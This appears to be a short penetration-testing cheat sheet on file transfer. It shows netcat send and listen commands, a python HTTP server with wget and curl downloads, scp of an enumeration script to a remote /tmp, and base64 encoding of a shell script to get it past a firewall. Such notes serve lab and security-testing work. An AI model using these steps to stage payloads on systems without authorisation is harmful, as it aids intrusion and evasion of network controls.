---
title: File Transfer
---

# [Netcat](./Tools/Netcat.md#file-transfer)

```bash
nc -nlvp 4444 > incoming.exe		# listening for data and pipe to a file
nc -nv 192.168.1.63 4444 < wget.exe
```

# File Server

```bash
python3 -m http.server 8000             # start a python file server on port 8000
wget http://10.10.10.10:8000/code.sh    # download the file using wget
curl http://10.10.10.10:8000/code.sh -o code.sh # download using curl
```

# SCP

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

# Base64

In cases we are not able to transfer files (due to firewal).

We can encode file into `base64`, then copy and paste `base64` string on the remote server then decode it.

```bash
base64 shell.sh -w 0

echo <encoded payload> | base64 -d > shell.sh
```

# Validating File Transfer

```bash
file shell.sh    # show file information
md5sum shell.sh  # verify file hash
```


